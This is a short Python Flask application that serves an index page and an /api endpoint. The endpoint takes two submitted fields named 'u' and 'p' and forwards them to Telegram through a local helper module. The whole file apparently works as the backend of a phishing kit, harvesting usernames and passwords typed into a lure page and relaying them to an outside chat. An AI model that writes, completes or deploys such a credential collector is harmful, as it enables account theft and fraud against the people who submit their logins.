from flask import Flask, redirect, render_template, request
from flask_restful import Resource, Api, reqparse
import telegram as t
app = Flask(__name__)
api = Api(app)

parser = reqparse.RequestParser()

class InsertId(Resource):
    def post(self):
        parser.add_argument('u')
        parser.add_argument('p')
        args = parser.parse_args()
        t.sendmessage(args['u'],args['p'])
        print(args['u'],args['p'])
        return {"status":"200"}


@app.route('/')
def index():
    return render_template('index.html')


api.add_resource(InsertId,'/api')

if __name__ == '__main__':
    app.run(debug=True)     